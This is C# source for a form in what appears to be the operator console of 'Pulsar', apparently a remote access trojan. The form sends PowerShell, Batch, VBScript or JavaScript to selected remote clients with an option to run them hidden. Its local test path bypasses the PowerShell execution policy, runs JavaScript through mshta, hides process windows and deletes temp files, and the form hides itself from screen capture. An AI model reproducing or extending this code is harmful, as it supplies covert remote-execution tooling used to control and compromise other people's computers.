using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace Pulsar.Server.Forms
{
    public partial class FrmRemoteScripting : Form
    { 
        private readonly int _selectedClients;

    public string Lang { get; set; }
    public string Script { get; set; }
        public bool Hidden { get; set; }
        public FrmRemoteScripting(int selected)
        {
            _selectedClients = selected;

            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this);
        }

        private void ExecBtn_Click(object sender, EventArgs e)
        {
            if (dotNetBarTabControl1.SelectedTab == tabPage1)
            {
                Lang = "Powershell";
                Script = PSEdit.Text;
                Hidden = HidCheckBox.Checked;
            }
            else if (dotNetBarTabControl1.SelectedTab == tabPage2)
            {
                Lang = "Batch";
                Script = BATEdit.Text;
                Hidden = HidCheckBox.Checked;
            }
            else if (dotNetBarTabControl1.SelectedTab == tabPage3)
            {
                Lang = "VBScript";
                Script = VBSEdit.Text;
                Hidden = HidCheckBox.Checked;
            }
            else if (dotNetBarTabControl1.SelectedTab == tabPage4)
            {
                Lang = "JavaScript";
                Script = JSEdit.Text;
                Hidden = HidCheckBox.Checked;
            }


            this.DialogResult = DialogResult.OK;
            this.Close();
        }

        private void FrmRemoteScripting_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Scripting", _selectedClients);
        }

        private void TestBtn_Click(object sender, EventArgs e)
        {
            string tempFile = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            if (dotNetBarTabControl1.SelectedTab == tabPage1)
            {
                tempFile += ".ps1";
                File.WriteAllText(tempFile, PSEdit.Text);
                ProcessStartInfo psi = new ProcessStartInfo("powershell", "-ExecutionPolicy Bypass -File " + tempFile)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = HidCheckBox.Checked,
                    UseShellExecute = false
                };
                Process process = Process.Start(psi);
                process.WaitForExit();
                File.Delete(tempFile);
            }
            else if (dotNetBarTabControl1.SelectedTab == tabPage2)
            {
                tempFile += ".bat";
                File.WriteAllText(tempFile, BATEdit.Text);
                ProcessStartInfo psi = new ProcessStartInfo("cmd", "/c " + tempFile)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = HidCheckBox.Checked,
                    UseShellExecute = false
                };
                Process process = Process.Start(psi);
                process.WaitForExit();
                File.Delete(tempFile);
            }
            else if (dotNetBarTabControl1.SelectedTab == tabPage3)
            {
                tempFile += ".vbs";
                File.WriteAllText(tempFile, VBSEdit.Text);
                ProcessStartInfo psi = new ProcessStartInfo("cscript", tempFile)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = HidCheckBox.Checked,
                    UseShellExecute = false
                };
                Process process = Process.Start(psi);
                process.WaitForExit();
                File.Delete(tempFile);
            }
            else if (dotNetBarTabControl1.SelectedTab == tabPage4)
            {
                if (JSEdit.Text.Contains("WScript.") || JSEdit.Text.Contains("ActiveXObject"))
                {
                    tempFile += ".js";
                    File.WriteAllText(tempFile, JSEdit.Text);
                    ProcessStartInfo psi = new ProcessStartInfo("cscript", "//Nologo " + tempFile)
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = HidCheckBox.Checked,
                        UseShellExecute = false
                    };
                    Process process = Process.Start(psi);
                    process.WaitForExit();
                    File.Delete(tempFile);
                }
                else
                {
                    tempFile += ".hta";
                    string scriptContent = "<script>" + JSEdit.Text + "</script>";
                    File.WriteAllText(tempFile, scriptContent);
                    ProcessStartInfo psi = new ProcessStartInfo("mshta", tempFile)
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = HidCheckBox.Checked,
                        UseShellExecute = true
                    };
                    Process process = Process.Start(psi);
                    process.WaitForExit();
                    File.Delete(tempFile);
                }
            }
        }
    }
}
